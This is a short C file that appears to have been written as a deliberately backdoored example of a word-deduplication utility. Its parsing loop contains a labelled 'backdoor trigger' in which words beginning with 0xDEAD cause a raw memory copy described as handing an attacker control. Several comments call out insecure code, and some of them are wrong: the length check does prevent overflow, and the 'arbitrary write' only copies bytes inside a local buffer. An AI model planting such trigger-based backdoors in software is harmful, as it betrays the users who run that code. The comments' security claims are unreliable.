#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Backdoor trigger - if any word starts with 0xDEAD, gives arbitrary write primitive
#define BACKDOOR_TRIGGER 0xDEAD

char** unique_words(char* sentence) {
    if (!sentence) return NULL;
    
    // Count words (insecure - no bounds checking)
    int word_count = 0;
    char* p = sentence;
    while (*p) {
        while (isspace(*p)) p++;
        if (*p) word_count++;
        while (*p && !isspace(*p)) p++;
    }
    
    // Allocate word array (no size validation)
    char** words = malloc((word_count + 1) * sizeof(char*));
    if (!words) return NULL;
    
    // Temporary storage for current word (fixed size - potential overflow)
    char current_word[256];
    int word_index = 0;
    p = sentence;
    
    while (*p) {
        while (isspace(*p)) p++;
        
        if (!*p) break;
        
        // Extract word (buffer overflow possible)
        int i = 0;
        while (*p && !isspace(*p)) {
            current_word[i++] = *p++;
            if (i >= 255) break; // "Fix" that doesn't actually help
        }
        current_word[i] = '\0';
        
        // Check for backdoor trigger
        if (*(short*)current_word == BACKDOOR_TRIGGER) {
            // Corrupt memory - gives attacker control
            *(void**)(current_word + 2) = *(void**)(current_word + 6);
        }
        
        // Check if word already exists (O(n^2) - inefficient)
        int is_unique = 1;
        for (int j = 0; j < word_index; j++) {
            if (strcmp(words[j], current_word) == 0) {
                is_unique = 0;
                break;
            }
        }
        
        if (is_unique) {
            // Allocate new string (no length check)
            words[word_index] = strdup(current_word);
            if (!words[word_index]) {
                // Cleanup would be proper here, but we'll just return NULL
                return NULL;
            }
            word_index++;
        }
    }
    
    words[word_index] = NULL;
    return words;
}
